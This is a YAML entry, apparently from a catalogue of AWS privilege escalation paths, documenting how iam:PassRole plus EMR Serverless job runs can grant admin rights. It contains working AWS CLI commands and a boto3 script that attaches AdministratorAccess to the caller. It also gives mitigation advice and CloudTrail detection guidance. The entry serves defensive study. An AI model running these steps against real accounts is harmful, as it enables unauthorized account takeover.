@@ -1,0 +1,272 @@
+id: emrserverless-001
+name: iam:PassRole + emr-serverless:CreateApplication + emr-serverless:StartJobRun
+category: new-passrole
+services:
+  - iam
+  - emr
+
+permissions:
+  required:
+    - permission: iam:PassRole
+      resourceConstraints: Must be able to pass the target admin IAM execution role to the EMR Serverless service
+    - permission: emr-serverless:CreateApplication
+      resourceConstraints: No resource constraints required
+    - permission: emr-serverless:StartJobRun
+      resourceConstraints: No resource constraints required
+  additional:
+    - permission: emr-serverless:GetApplication
+      resourceConstraints: Useful for polling application state before starting job runs
+    - permission: emr-serverless:GetJobRun
+      resourceConstraints: Useful for monitoring job run status and confirming execution
+    - permission: emr-serverless:ListApplications
+      resourceConstraints: Helpful for discovering existing applications
+    - permission: iam:ListAttachedUserPolicies
+      resourceConstraints: Useful for verifying privilege escalation success
+
+description: A principal with `iam:PassRole`, `emr-serverless:CreateApplication`, and `emr-serverless:StartJobRun` can escalate privileges by creating an EMR Serverless Spark application and starting a job run that passes an admin IAM execution role. The Spark job code runs using the execution role's credentials and calls `iam:AttachUserPolicy` to attach AdministratorAccess to the starting user. EMR Serverless handles all infrastructure provisioning, making this a fully serverless escalation path.
+
+prerequisites:
+  admin:
+    - A role must exist that trusts emr-serverless.amazonaws.com to assume it
+    - The role must have administrative permissions (e.g., AdministratorAccess or an equivalent custom policy)
+    - The AWS EMR Serverless service-linked role (AWSServiceRoleForAmazonEMRServerless) must exist in the account
+    - An S3 bucket must be accessible for job script storage and EMR Serverless logs
+  lateral:
+    - A role must exist that trusts emr-serverless.amazonaws.com and has elevated permissions
+    - An S3 bucket must be accessible for job script storage
+
+exploitationSteps:
+  awscli:
+    - step: 1
+      command: |
+        cat > /tmp/exploit.py << 'EOF'
+        import boto3
+
+        iam = boto3.client("iam", region_name="REGION")
+        iam.attach_user_policy(
+            UserName="STARTING_USER",
+            PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess"
+        )
+        print("AdministratorAccess attached successfully")
+        EOF
+
+        aws s3 cp /tmp/exploit.py s3://SCRIPT_BUCKET/scripts/exploit.py
+      description: Create a Spark exploit script that uses the execution role's credentials (injected automatically by EMR Serverless) to attach AdministratorAccess to the starting user. Upload it to S3.
+    - step: 2
+      command: |
+        aws emr-serverless create-application \
+          --name privesc-spark-app \
+          --release-label emr-7.7.0 \
+          --type SPARK
+      description: Create an EMR Serverless Spark application. The application type and release label determine the execution environment; no admin role is needed at this step.
+    - step: 3
+      command: |
+        aws emr-serverless get-application \
+          --application-id APPLICATION_ID \
+          --query 'application.state' \
+          --output text
+      description: Poll until the application reaches CREATED state before starting a job run.
+    - step: 4
+      command: |
+        aws emr-serverless start-job-run \
+          --application-id APPLICATION_ID \
+          --execution-role-arn arn:aws:iam::ACCOUNT_ID:role/ADMIN_ROLE \
+          --job-driver '{
+            "sparkSubmit": {
+              "entryPoint": "s3://SCRIPT_BUCKET/scripts/exploit.py",
+              "sparkSubmitParameters": "--conf spark.executor.instances=1"
+            }
+          }' \
+          --configuration-overrides '{
+            "monitoringConfiguration": {
+              "s3MonitoringConfiguration": {
+                "logUri": "s3://SCRIPT_BUCKET/logs/"
+              }
+            }
+          }'
+      description: Start a job run, passing the admin role as the execution role via iam:PassRole. The Spark job runs with the admin role's credentials and executes the exploit script to attach AdministratorAccess to the starting user.
+    - step: 5
+      command: |
+        aws emr-serverless get-job-run \
+          --application-id APPLICATION_ID \
+          --job-run-id JOB_RUN_ID \
+          --query 'jobRun.state' \
+          --output text
+      description: Poll job run status until it reaches SUCCESS, confirming the privilege escalation has completed.
+
+recommendation: |
+  High powered service roles + overly permissive `iam:PassRole` is what makes this privilege escalation path exploitable and impactful.
+
+  - **Avoid administrative EMR Serverless execution roles** - Very rarely does a Spark job need administrative IAM access. Use the principle of least privilege and scope execution roles to only the data and services the job legitimately requires.
+  - **Avoid granting `iam:PassRole` on all resources** - Whenever possible, restrict `iam:PassRole` to specific roles or specific services. Use IAM policy conditions to restrict which roles can be passed and to which services:
+
+  ```json
+  {
+    "Effect": "Allow",
+    "Action": "iam:PassRole",
+    "Resource": "arn:aws:iam::ACCOUNT_ID:role/SpecificEMRServerlessRole",
+    "Condition": {
+      "StringEquals": {
+        "iam:PassedToService": "emr-serverless.amazonaws.com"
+      }
+    }
+  }
+  ```
+
+  - Monitor CloudTrail for unusual EMR Serverless application creation followed by job runs with privileged roles
+  - Monitor CloudTrail for EMR Serverless job runs that reference roles with administrative permissions
+  - Monitor CloudTrail for roles being passed to EMR Serverless that haven't been used before
+  - Alert on IAM policy attachment events originating from EMR Serverless execution roles
+  - Regularly audit all IAM roles that trust emr-serverless.amazonaws.com and down-scope any with administrative access
+
+limitations: |
+  This path provides administrative access only if the passed execution role has administrative permissions (e.g., AdministratorAccess or an equivalent custom policy). If only limited roles are available to pass, the attacker gains access limited to those role permissions. Even limited access may enable multi-hop attacks.
+
+discoveryAttribution:
+  firstDocumented:
+    author: Seth Art
+    organization: Datadog
+    date: "2025"
+
+references:
+  - title: "Actions defined by Amazon EMR Serverless - Service Authorization Reference"
+    url: "https://docs.aws.amazon.com/service-authorization/latest/reference/list_amazonemrserverless.html"
+  - title: "IAM roles for EMR Serverless - Amazon EMR Serverless"
+    url: "https://docs.aws.amazon.com/emr/latest/EMR-Serverless-UserGuide/security-iam-role.html"
+
+learningEnvironments:
+  pathfinding-labs:
+    type: open-source
+    githubLink: https://github.com/DataDog/pathfinding-labs
+    scenario: "privesc-one-hop/to-admin/emr-serverless-001-iam-passrole+emr-serverless-createapplication+emr-serverless-startjobrun"
+    description: "Deploy Terraform scenarios individually or in groups, each with attack and cleanup scripts"
+
+attackVisualization:
+  nodes:
+    - id: start
+      label: Starting Principal
+      type: principal
+      description: |
+        The principal with iam:PassRole, emr-serverless:CreateApplication, and emr-serverless:StartJobRun permissions. Can be an IAM user or role.
+
+    - id: emr_app
+      label: New EMR Serverless Application
+      type: resource
+      description: |
+        New EMR Serverless Spark application created as the execution environment. The application type (SPARK) and release label determine the runtime. No privileged role is attached at application creation time - the execution role is specified per job run, allowing each job run to use a different role. AWS manages all underlying infrastructure; no EC2 instances are visible to the attacker.
+
+    - id: exec_role
+      label: Job Execution Role
+      type: principal
+      description: |
+        IAM role passed to the job run as the executionRoleArn via iam:PassRole. The role must trust emr-serverless.amazonaws.com to assume it. When the job run starts, the Spark workers run with this role's credentials automatically injected by the EMR Serverless service. The exploit script running inside the job accesses IAM APIs using these credentials.
+
+    - id: spark_job
+      label: Spark Job Script
+      type: payload
+      color: '#99ccff'
+      description: |
+        Malicious Python script uploaded to S3 and referenced as the Spark job entry point. When the job run executes, the script runs with the execution role's credentials automatically available via the boto3 default credential chain (injected by EMR Serverless).
+
+        Example exploit script:
+        ```python
+        import boto3
+
+        iam = boto3.client("iam", region_name="REGION")
+        iam.attach_user_policy(
+            UserName="STARTING_USER",
+            PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess"
+        )
+        print("AdministratorAccess attached successfully")
+        ```
+
+        The script is specified via `--job-driver sparkSubmit.entryPoint` in the StartJobRun call.
+
+    - id: admin
+      label: Effective Administrator
+      type: outcome
+      description: |
+        The execution role has AdministratorAccess or equivalent permissions. The Spark job script successfully calls iam:AttachUserPolicy, elevating the starting principal to full administrative access across the AWS account.
+
+    - id: some_perms
+      label: Some additional access
+      type: outcome
+      color: '#ffeb99'
+      description: |
+        The execution role has some elevated permissions but not full admin. The Spark script can leverage these permissions for data exfiltration (S3, DynamoDB, Secrets Manager), modification of security configurations, or staging further privilege escalation attempts.
+
+    - id: no_access
+      label: No additional access
+      type: outcome
+      color: '#cccccc'
+      description: |
+        The execution role only has minimal permissions. The Spark job executes successfully but cannot perform meaningful privilege escalation. The attack provides limited value despite the fully serverless execution.
+
+  edges:
+    - from: start
+      to: emr_app
+      label: emr-serverless:CreateApplication
+      description: |
+        Create an EMR Serverless Spark application. No privileged role is required at this step - the execution role is specified per job run. The application must reach CREATED state before job runs can be submitted.
+
+        Command:
+        ```bash
+        aws emr-serverless create-application \
+          --name privesc-spark-app \
+          --release-label emr-7.7.0 \
+          --type SPARK
+        ```
+
+    - from: emr_app
+      to: exec_role
+      label: iam:PassRole + emr-serverless:StartJobRun
+      description: |
+        Start a job run on the application, passing the admin role as the executionRoleArn. The Spark job driver is set to the exploit script in S3. The execution role's credentials are automatically injected into the Spark worker environment by EMR Serverless.
+
+        Command:
+        ```bash
+        aws emr-serverless start-job-run \
+          --application-id APPLICATION_ID \
+          --execution-role-arn arn:aws:iam::ACCOUNT_ID:role/ADMIN_ROLE \
+          --job-driver '{
+            "sparkSubmit": {
+              "entryPoint": "s3://SCRIPT_BUCKET/scripts/exploit.py",
+              "sparkSubmitParameters": "--conf spark.executor.instances=1"
+            }
+          }' \
+          --configuration-overrides '{
+            "monitoringConfiguration": {
+              "s3MonitoringConfiguration": {"logUri": "s3://SCRIPT_BUCKET/logs/"}
+            }
+          }'
+        ```
+
+    - from: exec_role
+      to: spark_job
+      label: Job runs with role credentials
+      description: |
+        The EMR Serverless service assumes the execution role and injects its temporary credentials into the Spark worker environment. The malicious Python entry point script runs within the worker, with boto3 automatically discovering and using the injected credentials to make IAM API calls.
+
+    - from: spark_job
+      to: admin
+      label: If role has admin or IAM write permissions
+      branch: A
+      condition: admin
+      description: |
+        If the execution role has AdministratorAccess or IAM write permissions (iam:AttachUserPolicy), the Spark script successfully attaches AdministratorAccess to the starting principal. The privilege escalation is confirmed once the job run reaches SUCCESS state.
+
+    - from: spark_job
+      to: some_perms
+      label: If role has some elevated permissions
+      branch: B
+      condition: some_permissions
+      description: |
+        If the execution role has elevated but non-admin permissions, the Spark script can still read sensitive data from S3, access secrets, or interact with other AWS services within the role's permission boundary.
+
+    - from: spark_job
+      to: no_access
+      label: If role has minimal permissions
+      branch: C
+      condition: no_permissions
+      description: |
+        If the execution role only has minimal permissions, the Spark script cannot perform meaningful privilege escalation despite the fully serverless execution completing successfully.
